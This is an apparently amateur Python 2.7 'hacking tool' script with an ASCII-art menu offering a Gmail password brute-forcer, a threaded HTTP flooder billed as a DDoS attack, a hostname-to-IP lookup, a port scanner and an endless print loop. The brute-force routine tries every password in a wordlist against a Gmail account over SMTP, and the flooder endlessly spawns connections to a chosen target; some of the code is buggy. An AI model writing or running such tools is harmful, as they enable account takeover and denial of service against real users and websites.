




import os
os.system("clear")
import time as v
print "\n"*1000
v.sleep(2)
print """     \033[2;340;50m                         
 
       __     __  _____   _____    _____    ___     ___    _     
 \ \   / / | ____| |__  /   |_   _|  / _ \   / _ \  | |    
  \ \ / /  |  _|     / /      | |   | | | | | | | | | |    
   \ V /   | |___   / /_      | |   | |_| | | |_| | | |___ 
    \_/    |_____| /____|     |_|    \___/   \___/  |_____|
                                                           
                                                                         """
v.sleep(1.5)
print """By VipRs  __ >>Python2.7               
         |__|                 """
v.sleep(1)
print "1_brutefroce" 
print "2_ddos attack"
print "3_ip website" 
print "4_surprise!" 
print "5_scan ip & port"
number = raw_input ("choose a number:")
def vip (vip2):
    print"you choosed:",number
    print "script made by vip rs"
vip ("to the script")
if number =="1":

    import time as v
    print "\n"*1000
    v.sleep(2)
    print """     \033[1;33;50m            __    ____    _   _   _____   
 \ \   / / | ____| |__  /   | __ )  |  _ \  | | | | |_   _| | ____|
  \ \ / /  |  _|     / /    |  _ \  | |_) | | | | |   | |   |  _|  
   \ V /   | |___   / /_    | |_) | |  _ <  | |_| |   | |   | |___ 
    \_/    |_____| /____|   |____/  |_| \_\  \___/    |_|   |_____|
                                                                                                                       
                                                                         """
    v.sleep(1.5)
    print """By VipRs  __ >>Python2.7               
         |__|                 """
    v.sleep(1)




    print "welcome to the script made by vip rs"
    import smtplib
    smtpserver = smtplib.SMTP("smtp.gmail.com",587)
    smtpserver.ehlo()
    smtpserver.starttls()

    user = raw_input("gmail @gmail.com/gmail: ")
    passwd = raw_input("put the list: ")
    passwd = open(passwd, "r")

    for password  in passwd: 
        try :
                 smtpserver.login (user, password)
                 print "<==========!!!Congratz You got the Password!!!==========> %s " % password 
                 break;
        except smtplib.SMTPAuthenticationError:
                print "good luck to get the password =======> %s" % password 
      
elif number == "2":
    print "welcome ddos attack"
    import time as v
    import socket
    import threading
    print "\n"*1000
    v.sleep(2)
    print """     \033[1;36;50m                         
  __     __  _____   _____       _      _____   _____      _       ____   _  __
 \ \   / / | ____| |__  /      / \    |_   _| |_   _|    / \     / ___| | |/ /
  \ \ / /  |  _|     / /      / _ \     | |     | |     / _ \   | |     | ' / 
   \ V /   | |___   / /_     / ___ \    | |     | |    / ___ \  | |___  | . \ 
    \_/    |_____| /____|   /_/   \_\   |_|     |_|   /_/   \_\  \____| |_|\_\
                                                                              

                                                                               """
    v.sleep(1.5)
    print """By VipRs  __ >>Python2.7               
         |__|                 """
    v.sleep(1)
    target =raw_input("Ip>>")
    port = 80
    print "port 80..."
    v.sleep(2)
    def xxx():
        x = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        x.connect((target, port))
        x.sendto(("GET /{target} HTTP/1.1\rboot off da skid :v\n").encode("ascii"), (target, port))
        x.close()
    ix = 0
    while ix != 100:
        v.sleep(0.5)
        thread = threading.Thread(target=xxx)
        thread.start()
        print "Socket Sent!"
elif number == "3":  
    import socket
    import sys
    import time as v
    print "\n"*1000
    v.sleep(2)
    print """     \033[1;35;50m           
  __     __  _____   _____   __        __  _____   ____  
 \ \   / / | ____| |__  /   \ \      / / | ____| | __ ) 
  \ \ / /  |  _|     / /     \ \ /\ / /  |  _|   |  _ \ 
   \ V /   | |___   / /_      \ V  V /   | |___  | |_) |
    \_/    |_____| /____|      \_/\_/    |_____| |____/ 
                                                        
                                                                                                                      
                                                                         """
    v.sleep(1.5)
    print """By VipRs  __ >>Python2.7               
         |__|                 """
    v.sleep(1)

   

    print "welcome,enter your dns target"
    hostname = raw_input("")
    ip=socket.gethostbyname(hostname)
    print "host name is:" ,hostname, "\n" "target ip is:",ip
elif number == "4":
    print"made for fun"
    list80 =10000000000000000000
    while list80 >9999999:
        print list80 + 1

elif number == "5":
   import time as v
   print "\n"*1000
   v.sleep(2)
   print """     \033[1;37;50m           
__     __  _____   _____    ____     ____      _      _   _ 
 \ \   / / | ____| |__  /   / ___|   / ___|    / \    | \ | |
  \ \ / /  |  _|     / /    \___ \  | |       / _ \   |  \| |
   \ V /   | |___   / /_     ___) | | |___   / ___ \  | |\  |
    \_/    |_____| /____|   |____/   \____| /_/   \_\ |_| \_|
                                                             

                                                                                                                      
                                                                         """
   v.sleep(1.5)
   print """By VipRs  __ >>Python2.7               
         |__|                 """
   v.sleep(1)
   print "made by viprs..."
   import socket 
   import sys
   from time import *
   from datetime import datetime



   ip = raw_input("Please put your ip to start...!:")
   t1 = datetime.now()
   print "scanning....! %s please wait" % (ip)
   sleep(1)


try:
        for port  in range (1,655):
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   
            if(s.connect_ex((ip,port))==0):
                try:
                    serv=socket.getservbyport(port)

                except socket.error:
                    serv="unknown service"

                print "port %s, open service %s" % (port,serv)
            t2=datetime.now()  
            t3=t2-t1
        print "scanning completed on %s" % (t3)
except KeyboardInterrupt:
    print"see you soon..."

